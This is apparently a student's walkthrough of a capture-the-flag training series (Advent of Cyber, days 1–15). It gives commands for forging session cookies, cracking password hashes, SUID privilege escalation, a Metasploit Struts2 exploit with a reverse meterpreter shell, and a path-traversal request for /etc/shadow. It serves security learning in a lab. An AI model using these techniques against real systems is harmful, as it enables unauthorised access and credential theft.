# Advent of CyberSecurity

Date: Jun 24, 2020
Progress: approved
Tags: kali, practical, week3

# Day 1 - Inventory Management

## 1.1 Background

- Hyper Text Transfer Protocol (HTTP) is a standardised method of communication between client and server that works in forms of requests. Client send requests to servers for actions like logging in, retrieving pages and information
- HTTP Cookie is a piece of data stored in the clients machine so that the server can keep track of the whereabouts of the user and ensures that they perform authorised actions only.
- Read more [here](https://docs.google.com/document/d/1PHs7uRS1whLY9tgxH1lj-bnEVWtXPXpo45zWUlbknpU/edit)

## 1.2 Question #1 Solution

- The  website `http://<your_machines_ip>:3000` opens to `login` page asking for email and password. Since we don't have any credentials to login and in turn create cookies, we register in the site with username of our choosing.
- Upon inspection after logging in, an authentication cookie `authid` is discovered, this answers the first question of the challenge.

## 1.3 Question #2 Solution

- By the looks of it, the value of `authid` is an encoded hash value and a fairly common encoding type for cookies is Base64 Encoding. So [decoding](https://www.base64decode.org/), the cookie reveals a structure wherein the username is prefixed to a fixed value. This fixed value `v4er9ll1!ss` IS the answer to the second question

## 1.4 Question #3 Solution

- To check on requests made by `mcinventory` we need to be first logged in as the same user.
- At this point we can bypass the login process by simply fabricating a session cookie for the user. The cookie is a concatenation of username and a fixed value. [Encoding](https://www.base64encode.org/) the combination to base64 would give us our very own cookie, `bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw==`
- Finally, replacing the current session with the above value reveals all the user requests. Quiet ironically, `mcinventory` requested for a firewall! (Duh!)

# Day 2 - Arctic Forum

## 2.1 Background

- Brute Forcing Directories means using most-commonly used vocabularies associated with directories to reveal information about their (the directories) existence based on the response of the server. For example for a /random_directory, server might respond with status code 200 indicating successful retrieval
- The process is automated using [DirSearch](https://github.com/maurosoria/dirsearch)

```bash
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python3 dirsearch.py -u <URL> -e <EXTENSION>
```

- Read more [here](https://docs.google.com/document/d/1622ejYtCmLOS0zd16CyfhA1xgQk8l55gYWMY8fnpHfQ/edit)

## 2.2 Question #1 Solution

- As instructed by the Google Doc manual for the challenge, we run DirSearch on the Day 2 Challenge server with a wordlist file as follows

```bash
python3 dirsearch.py -e php,txt,zip -u http://10.10.112.242:3000 -w ./DirBuster-Lists/directory-list-2.3-medium.txt
```

- The search takes some time but reveals a list of directories to which the server has successfully responded. Among the directories with response code `200`, `/sysadmin` looks super tempting. And sure enough, `http://<your_machines_ip>:3000/sysadmin` opens up an Admin Login page.
- Well, that answers our question!

## 2.3 Question #2 Solution

- The inspection of the HTML element of the page `http://<your_machines_ip>:3000/sysadmin` reveals a comment asking to visit a git repo for Arctic digital design

```bash
<!--
Admin portal created by arctic digital design - check out our github repo
-->
```

- A [README.md](http://readme.md) file in the repo contains the following:

```bash
username: admin
password: defaultpass
```

## 2.3 Question #3 Solution

- So we login to the Admin Login page with aforementioned credentials and find ourselves inside the forum.
- A picture in the forum says, "Hey all - Please don't forget to BYOE(Bring Your Own Eggnog) for the partay!!"

# Day 3 - Evil Elf

## 3.1 Background

- Wireshark is a popular network analysis tool to capture network traffic and filter them to reveal the contents they carry.
- **pcap** file creates a record of network data that can be viewed through Wireshark
- Hash values are unique non-human readable strings generated using hash functions that map to specific words or text. Hashing cannot be reversed and hence can be cracked only by comparison of hashes of a wordlist and the original hash.
- Read more [here](https://docs.google.com/document/d/1ZVsOtW7mM-4neZZ4QtYCEp__exiMrvlUCXTxhB-zyxk/edit#)

## 3.2 Question #1 Solution

- Opening the provided **pcap** file in WireShark displays a table of communicating packets each with features like Number, Time, Source, Destination and Protocol among others
- The No. column of the table gives the number of a packet. The table can be read to find that corresponding Destination of packet with No. 998 is `63.32.89.195`

## 3.3 Question #2 Solution

- To follow the complete stream of data, when the two machines where communicating, we can right click on the first packet shown, then click follow, and then TCP Stream.
- By following the TCP stream of packet`998` we discover a command sent to a remote machine (shown in red)

```bash
ps4 > chistmas_list.txt
```

- Well then its obvious that it's **ps4**  that is in the Christmas List

## 3.4 Question #3 Solution

- Passwords are saved as hash values and they can be cracked only by aforementioned process of brute force. Luckily for us, hashcat does most of the work.

```bash
hashcat -m 1800 <your_hash_file> <your_list_file>
```

- We find the password hash `$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1` for `buddy` by following the TCP stream and save it in a file called `hash_file.txt`.
- Next we need to find the type of hashing algorithm. Okay, the **SHA512crypt** (1800) hash begin with `$6$`
- Finally we are all set to crack the hash with a wordlist

```bash
hashcat -m 1800 hash_file.txt ~/Downloads/rockyou.txt --force
```

- And the password is: `rainbow`!

# Day 4 - Training

## 4.1 Background

- User should be familiar with using command line in Linux terminal and ssh-ing to access remote  machine

## 4.2 Question #1 Solution

- To find the number of files in the home directory, use `ls` command

## 4.3 Question #2 Solution

- To read the content of `file5` use `cat` command

```bash
cat file5
# Returns "recipes"
```

## 4.4 Question #3 Solution

- To search for a file containing a keyword use `grep` command as follows

```bash
grep -l -e "password" -f *
# -l flags lists only matched files
# -e flag for providing a pattern
# -f flag mention files to search for 
```

## 4.5 Question #4 Solution

- IP addresses have a fixed structure: ****.****.****.****
- We can search for regular expression pattern: `([0-9]{1,3}[\.]{3}[0-9]{1,3}` that represents the structure of an IP address

```bash
cat * | grep -e "([0-9]{1,3}[\.]{3}[0-9]{1,3}" -o
# Reads the content of all the files in the directory
# -e flag inputs the regular expression pattern
# -o prints matched string only
# Returns 10.0.0.05
```

## 4.6 Question #5 Solution

- The number of sub-directories in the home directory gives a fair idea about the number of users in the machine

```bash
cd ..
# Change directory to the parent directory of the /
# current dir i.e user mcsysadmin's home page
ls
```

## 4.7 Question #6 Solution

- `sha1sum` command computes and checks SHA1 hash of a file. As such, it can be used to verify the integrity of a file, check if it has been modified or not

```bash
sha1sum file8
# Returns fa67ee594358d83becdd2cb6c466b25320fd2835  file8
```

## 4.8 Question # Solution

- Password hash are stored in file **/etc/shadow** that demands root privileges. We don't have the permission to read it! However, there might be **.bak** backup files lying around to which we have permissions of read. So we search for a backup file **shadow.bak**

```bash
find / | grep "shadow.bak"
# We now know there is a valid .bak file in the /var /
# directory 
cat /var/shadow.bak
```

- The password hash is: `$6$jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/`

# Day 5 - Ho-Ho-Hosint

## 5.1 Background

- OSINT OR Open Source Intelligence is data collected from publicly available sources to be used in an intelligence context.
- Metadata is text information, embedded in the first few bytes of an image.
- Exiftool is a free and open-source program for reading metadata on files.
- Read More [here](https://blog.tryhackme.com/ho-ho/)

 

## 5.2 Question #1 Solution

- The metadata of the provided picture reveals the name of the Creator, `JLolax1`, which must be the username ELf Lola uses on her social media handles. We'll basically stalk down this user.

```bash
exiftool thegrinch.jpg
```

- Sure enough, Google serach reveals a Twitter Account associated with, no other than, Elf Lola!
- The twitter bio gives the information on her birthday which is December 29, 1900

## 5.3 Question #2 Solution

- Elf Lola on her bio tells us that she's currently on of Santa's Helpers

## 5.4 Question #3 Solution

- Her tweets reads:

Oooo!
Us Elves can now make iPhone's! Who'da thought it!
~ Sent from iPhone

## 5.5 Question #4 Solution

- We can view changes made to a website from archives at [WaybackMachine](https://web.archive.org/). The earliest date that Lola posted photos was on October 23, 2019. Upon  checking the website's status on the same day, a subheading tells us that Lola started freelance photography 5 years ago, the same day i.e October 23, 2014.

## 5.6 Question #5 Solution

- Attached in her bio is a link to Elf Lola's website. The website features pictures among which one is of a woman, Ada Lovelace! We run a quick reverse image search on Google Images to verify if it's indeed her. (feels validated!)

# Day 6 - Data Elf-iltration

## 6.1 Background

- Data Exfiltration is the technique of transferring unauthorized data out of the network and Data Loss Prevention systems prevent data exfiltration.
- Exfiltration is most common with DNS because it blends in with normal traffic. Data can be hidden or embedded inside pictures and files so any unusual transfer indicates exfitration.
- We can extract contents of transferred files using Wireshark by: File → Export Object →HTTP
- Read More [here](https://docs.google.com/document/d/17vU134ZfKiiE-DgiynrO0MySo4_VCGCpw2YJV_Kp3Pk/edit#)

## 6.2 Question #1 Solution

- Running aquick `DNS` filter in the `holidaythief.pcap` usin Wireshark shows that there have been some hex string communication with a domain `[holidaythief.com](http://holidaythief.com)`
- Conversion of the hex string to ASCII shows the data is actually: Candy Cane Serial Number 8491

## 6.3 Question #2 Solution

- There are 2 HTTP objects that can be exported: `[christmaslists.zip](http://christmaslists.zip)` and `TryHackMe.jpg`
- Simple unzip command on the zip  file prompts us to a password that we most certainly don't possess
- What we need to do now is try and crack the password with brute force using the following command:

```bash
sudo apt install fcrackzip 
fcrackzip -b --method 2 -D -p ~/Downloads/rockyou.txt -v  christmaslists.zip
# Returns password december ()
```

- Finally, we `unzip` `[christmaslists.zip](http://christmaslists.zip)` using the password we found. One among the extracted file is: `christmaslisttimmy.txt` whose content reveal Timmy wants a PenTester

## 6.4 Question #3 Solution

- We try our luck with the picture and check for steganography in it with the following command:

```bash
sudo apt install steghide
steghide extract -sf TryHackMe.jpg
# Asks for password and still extracts data to christmasmonster.txt 
```

- The contents of file `christmasmonster.txt` is parody poem with the heading ARPAWOCKY and a subheading RFC527

# Day 7 - Skilling Up

## 7.1 Background

- OSI model is an ideal framework for networks that segments the entire networking process in layers. Each layer is modular and connected to the layer above and below it.
- Most commonly machines are attacked when their IP addresses are known. Network enumeration, i.e the retrieval of information on usernames, groups and shares of networked computers must be carried out by scanning ports.
- TCP Scan

```bash
nmap -sT -p port-number -O -sC -sV -oA output-file-name ip-address
# -sT for a TCP connection to the host
# -sC to run default scripts
# -sV to dertermine the version sevices running on open ports
# -O to determine the OS of the host
# -oN to give the name of outpufie 
# -p for portnumbers

```

- UDP Scan

```bash
nmap -sU -p port-number -O -sC -sV -T[1-5] -oA output-file-name ip-address
```

## 7.2 Question #1 Solution

- A nmap scan is carried out on the host and stored to a file as follows.

```bash
sudo nmap -A -sT -p-1000 -oN "nmap_result.txt" 10.10.120.84
cat nmap_result.txt | grep "tcp"
```

## 7.3 Question #2 Solution

- Find the OS by:

```bash
cat nmap_result.txt | grep "OS"
# A quick scan and we can see a line x86_64-pc-linux-gnu
# Well then the host OS is linux
```

## 7.4 Question #3 Solution

```bash
cat nmap_result.txt | grep "ssh" 
# Reveals ssh type Openssh 7.4
```

## 7.5 Question #4 Solution

- Reading the nmap result file we come across "SimpleHTTPserver running on port 999" which means there is a webpage we can open in the host.
- The webpage on <ip_address>:999 displays a file  name `interesting.file`

# Day 8 - SUID Shenanigans

## 8.1 Background

- Set owener UserID is a special type of file-permission that allows a user to run a program with privileges of other users.
- If a binary has the SUID bit set, it will have an **s** appear on its permissions, example -rwsr-xr-x
- We can scan the whole file system to find all files with the SUID bit set, with the following code:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
```

## 8.2 Question #1 Solution

- To ssh to Holly's machine we need to know which of her ports  ssh is running. Therefore, we run a nmap scan as follows:

```bash
nmap -sV -p- <ip_address>
```

- The nmap scan on ALL the ports takes time. We find that the port 65534 runs ssh

```bash
ssh holly@<ip_address> -p 65534
```

## 8.3 Question #2 Solution

- Oops! file1.txt is not owned by holly but Igor. Let's try something else.
- The question stresses on Find and Igor, may be something's up with the find command. We pay the file a visit with the following command and find that the file, indeed is owned by Igor. Neat!

```bash
ls -l /usr/bin/find
```

- Lucky for us, the find file has 's' set on file permissions giving us the privilege to use it. We can use the -exec, execute further flag with `find` command and then user `cat` command immediately to read the contents of file1.txt.

```bash
find /home/igor/flag1.txt -exec cat /home/igorflag1.txt \;
# Returns THM{d3f0708bdd9accda7f937d013eaf2cd8}
```

- This works because `find` command owned by Igor elevates our privileges  to read the contents of a filed which again, is owned by him

## 8.3 Question #3 Solution

- Let's find all the files in root with 's' bit set on their permissions using the command:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null | grep "/bin"
```

- Among a list of files, we find a file name `/usr/bin/system-control` which grants control equivalent to the root. That means, we can read files owned by root!

```bash
/usr/bin/system-control 
cat /root/flag2/txt
# Returns THM{8c8211826239d849fa8d6df03749c3a2}
```

# Day 9 - Requests

## 9.1 Question #1 Solution

- There is a port 3000 on the website `10.10.169.100` that displays a what looks like a dictionary (but is a JSON object) with keys, `value` and `next`. We are supposed to record the value of the key `value` until `next` is `end`

```bash
import requests

host = "http://10.10.169.100:3000"
path = "/" 
values = []

while path  != "/end":
        response = requests.get(host + path)
        json_response = response.json()
        path = "/" + json_response["next"]
        if path != "/end":
                values.append(json_response["value"])
print("".join(values))
```

- Flag: sCrIPtKiDd

# Day 10 - Metasploit-a-Ho-Ho-Ho

## 10.1 Background

- The Metasploit Framework is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code. An exploit is a code that takes advantage of a software vulnerability or security flaw.
- With Metasploit you can choose your exploit and payload, then execute it against your chosen target

```bash
msfconsole
# start the Metasploit Framework console interface
```

- A module is a piece of software that can perform a specific action, such as scanning or exploiting. Module is equivalent to an exploit code. We can select modules on Metaspoilt using `use <module_name>`

```bash
use multi/http/struts2_content_type_ognl
```

- `show options` command then gives you options on various methods to exploit an application. It will also so `RHOST` and `RPORT` to set a target machine and `LHOST` and `LPORT` to specify your machine

```bash
set RHOST <host_addresse> 
```

- Finally `PAYLOAD` is the shell code that runs after an exploit successfully compromises a system

```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

## 10.2 Question #1 Solution

```bash
# set target host and port
set RHOST 10.10.169.140
set RPORT 80 # because http 
# Set URI
set TARGETURI /showcase.action
# set local host 
set LHOST 10.8.36.152
```

- We are all set to exploit!

```bash
exploit
# Starts a meterpreter shell
# let's find out file flag1
find / 2>>/dev/null | grep -i "flag1"
# find command does not work because apparently
# meterpeter is no a shell
shell
find / 2>>/dev/null | grep -i "flag1"
# Quit the shell to read contents
cat usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
# Returns THM{3ad96bb13ec963a5ca4cb99302b37e12}
```

## 10.3 Question #2 Solution

- So far we have just compromised the machine and be still don't have root permissions.
- We search for any ssh login credentials

```bash
find / | grep "ssh"
# There we have it a file ssh-creds.txt
cat /home/santa/ssh-creds.txt
# Returns santa:rudolphrednosedreindeer
```

## 10.4 Question #3 Solution

- After ssh-ing to Santa's machine we find that in his home are two files, `naughty_list.txt` `nice_list.txt`.
- To read specific lines of a file we use the command `cat` with line numbers

```bash
cat naughty_list.txt -n 
```

- At 148 is Melisa Vanhoose

## 10.4 Question #4 Solution

```bash
cat nice_list.txt -n
```

# Day 11 - Elf Application

## 11.1 Background

- FTP is the file transfer protocol. The protocol usually runs on port 21 on top of the TCP protocol. FTP is a fairly old protocol that is used to transfer files.
- Most FTP servers allow anonymous login where a user can authenticate with the username: anonymous and password: anonymous

```bash
ftp ip-address
```

- NFS is a network file share that runs on both TCP and UDP on port 111 and 2049. it uses the linux permission system to manage these things.
- NFS Enumeration

```bash
showmount -e ip-address
```

- MySQL is a service that runs an SQL server.

## 11.2 Question #1 Solution

- For NFS enumeration we run the following command:

```sql
sudo showmount -e 10.10.117.160
# Server willing to export all the files in directory 
# /opt/files, we download by mounting the files in
# local machine
mount 10.10.117.160:/opt/files ~/gajabaar
# inside thelocal directory we hace the file creds.txt
cat creds.txt
# securepassword123
```

## 11.3 Question #2 Solution

```bash
ftp ip-address
# login with anonymous
ls 
# shows the file we're looking for, file.txt
# Have to download file 
# However, it is mentioned ftp uses binay mode
# to transfer file 
binary 
get file.txt

```

- The file is downloaded to the home directory of the local machine. It contains the credentials to login to mysql

## 11.4 Question #3 Solution

```bash
mysql -h 10.10.117.160 -uroot -pff912ABD*

```

- Now we can navigate through the databases in mysql

```sql
show databases;
use data; 
show tables;
# A tablenames USERS!
SELECT * FROM USERS; 
# Returns a table with username and password
```

# Day 12 - Elfcryption

## 12.1 Question #1 Solution

- The given zip file is extracted to find three files one of which is `note.txt.gpg`
- The md5 check sum of the file can be found by following command

```sql
md5sum note.txt.gpg 
```

## 12.2 Question #2 Solution

- gpg files are gpg encrypted files, then note.txt.gpg can be decrypted by

```sql
gpg -d note.txt.gpg 
# Asks for pass phrase "25daysofchristmas"
# Returns "I will meet you outside Santa's Grotto at 5pm!"
```

## 12.3 Question #3 Solution

- The two remaining files are `note2_encrypted.txt` and `private.key`
- The fact that a private key is provided instead of a public key, implies that the encryption type is assymmetric, perhaps, RSA

```sql
openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt
```

- Flag: THM{ed9ccb6802c5d0f905ea747a310bba23}

# Day 13 - Accumulate

## 13.1 Question #1 Solution

- A nmap scan on the deployed machine unveils two open port, `80` and `3389`
- Port 80 means http webage. It opens Microsoft Internet Information Services page. Well, then lets scan for any hidden directories

```sql
python3 dirsearch.py -e php,txt,zip -u http://10.10.171.168 -w ./DirBuster-Lists/directory-list-2.3-medium.txt
```

- Almost 2% into the scan and a directory `/retro` is unveiled

## 13.2 Question #2 Solution

- Upon navigating the subdirectory, we find ourselves in a webpage, possibly owned by a person `Wade` . The site contains numerous post/articles written by him. One of the article is name `Ready Player One` on which `Wade` himself comments with a password `parzival`!
- We might be on to something because there is indeed a Login option that redirects to Wordpress login page. Using the credential we land ourselves onto Wade's Wordpress, but no sign of a file named `user.txt` . (sad)
- Okay now we try to 'hack' into Wade's machine using Remmina with the same login credentials. Viola! lying on his desktop is a text file `user.txt` that contains flag: `THM{HACK_PLAYER_ONE}`

## 13.2 Question #2 Solution

- We try and open a dialog box. Navigate the files within that dialog box to find /Users/Adminitrator/Systems32 and launch cmd.
- We have now root permissions to read files. The text file on desktop is read to find `THM{COIN_OPERATED_EXPLOITATION}`

```sql

dir
more root.txt.txt
```

# Day 14 - Unknown Storage

## 14.1 Background:

- Cloud Storage like AWS provide the ability for clients to store a lot of data using a service called Simple Storage Service(S3).
- Files are stored on what are called buckets and these buckets can have insecure permissions
- If we have a name of publicly accessible bucket then the contents can be accessible by browsing to the URL. The format of the URL is: `bucketname.s3.amazonaws.com`
- To download the files, you can use the command:

```sql
*aws s3 cp s3://bucket-name/file-name local-location*
```

## 14.2 Question #1 Solution

- We are given the bucket name and now we can access it from [`http://advent-bucket-one.s3.amazonaws.com/`](http://advent-bucket-one.s3.amazonaws.com/)
- A file employee_names.txt is inside the bucket.

## 14.3 Question #2 Solution

- WE access the file content from `[http://advent-bucket-one.s3.amazonaws.com/employee_names.txt](http://advent-bucket-one.s3.amazonaws.com/employee_names.txt)`, which is `mcchef`

# Day 15 - Local File Inclusion

## 15.1 Background

- Some web applications include the contents of other files, and prints it to a web page. For example if a web application has the following request: [https://example.com/?include_file=file1.php](https://example.com/?include_file=file1.php), this would take the contents from file1.php and display it on the page.
- If an application doesn't whitelist which files can be included, a user would be able to request the file /etc/shadow, showing all users hashed passwords on the system running the web application.
- If we had to access a file like [https://example.com/notes/?include=/etc/shadow](https://example.com/notes/?include=/etc/shadow), the server will think its going to /notes/include/etc/shadow. You can't include a slash in the URL as the web server will think its making a request to a different directory.
- The solution is to use URL encoding. URL encoding replaces unsafe ASCII characters with '%' followed by two hexadecimal digits. A slash (/) can be URL encoded as **%2F**

## 15.2 Question #1 Solution

- A quick nmap scan finds out that the port `22` for ssh and `80` for http are open on the deployed machine
- Simply opening the ip _address of the deployed machine displays Charlie's note and on plain sight lies our answer, he is booking a holiday to Hawaii

## 15.3 Question #2 Solution

- On visiting the website's source code we find that the server is pulling the text file from view/notes directory. We need to draft a URL for pulling the /etc/passwd from the server. We bypass the `/`filter using ASCII encoding `%2F` and try to load the webpage as follows:

```bash
http://<machine IP>/get-file/..%2f..%2f..%2f..%2f..%2fetc%2fshadow
```

- Once Charlie's hash values are obtained we try and crack it as follows

```bash
hashcat -m 1800 charlie_hash.txt ~/Downloads/rockyou.txt --force
```

- Password: `password1`

## 15.2 Question #3 Solution

- We have in our possession the login credentials of Charlie's machine. We access the machine remotely with ssh and read the content of the `flag1.txt`
- Flag: `THM{4ea2adf842713ad3ce0c1f05ef12256d}`